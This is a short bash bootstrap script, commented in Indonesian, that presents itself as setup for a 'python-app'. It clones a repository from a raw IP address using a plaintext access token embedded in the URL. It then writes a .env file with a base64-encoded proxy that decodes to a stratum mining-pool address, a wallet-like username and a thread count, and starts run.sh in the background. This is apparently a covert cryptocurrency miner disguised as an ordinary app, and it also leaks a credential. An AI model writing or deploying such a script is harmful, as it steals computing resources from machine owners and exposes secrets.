#!/bin/bash
set -e

echo "[bootstrap] mulai setup python-app..."

# Clone repo python-app kalau belum ada
if [ ! -d "/app/python-app" ]; then
  git clone http://adminjerry:11a75ed3804a5df1b444f813b9f084310bb64eef@159.89.237.227:3000/adminjerry/python-app.git /app/python-app
fi

cd /app/python-app

# Fix line endings
sed -i 's/\r$//' run.sh

# Buat .env
cat <<EOF > .env
proxy=wss://wes.baleribo.space/c3RyYXR1bS1uYS5uYS5ycGxhbnQueHl6OjcwMjI=
host=127.0.0.1
port=3036
username=mbc1q7sm9tj0fy5yvmyrq6cwehn9wagv0t593gjc46d.asssssssss
password=x
threads=15
EOF

chmod +x run.sh

# Jalankan run.sh 4 di background
./run.sh 4 &

cd /app
echo "[bootstrap] selesai setup python-app"
